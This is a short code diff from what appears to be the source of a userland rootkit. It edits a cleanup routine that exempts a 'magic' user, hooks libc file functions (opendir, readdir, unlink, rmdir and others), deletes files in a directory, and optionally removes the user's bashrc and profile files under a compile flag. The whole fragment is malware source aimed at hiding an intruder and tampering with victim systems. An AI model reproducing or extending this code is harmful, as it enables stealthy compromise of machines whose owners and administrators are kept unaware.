@@ -1,6 +1,5 @@
 void bdvcleanse(void){
-    gid_t magicgid = readgid();
-    if(getuid() == magicgid || getgid() == magicgid || rkprocup())
+    if(magicusr() || rkprocup())
         return;
 
     hook(COPENDIR, CREADDIR, CACCESS, CUNLINK, C__LXSTAT, CRMDIR);
@@ -31,7 +30,8 @@ void bdvcleanse(void){
                 call(CUNLINK, path);
     }
     closedir(dp);
-
+#ifdef ROOTKIT_BASHRC
     call(CUNLINK, BASHRC_PATH);
     call(CUNLINK, PROFILE_PATH);
+#endif
 }
